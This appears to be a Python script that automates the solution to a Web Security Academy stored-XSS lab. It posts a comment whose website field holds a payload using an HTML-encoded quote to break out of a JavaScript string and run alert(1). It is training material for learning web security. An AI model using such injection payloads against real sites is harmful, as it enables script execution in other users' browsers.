from web_security_academy.core.logger import logger


def solve_lab(session):
    xss = "https://www.google.com&apos;); alert(1); //"

    csrf = session.get_csrf_token("/post?postId=1")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": "Lorem ipsum dolor sit amet",
        "name": "user",
        "email": "user@example.com",
        "website": xss,
    }
    session.post_path("/post/comment", data=data)
    logger.info("Posted a comment with the following website:")
    logger.info(xss)
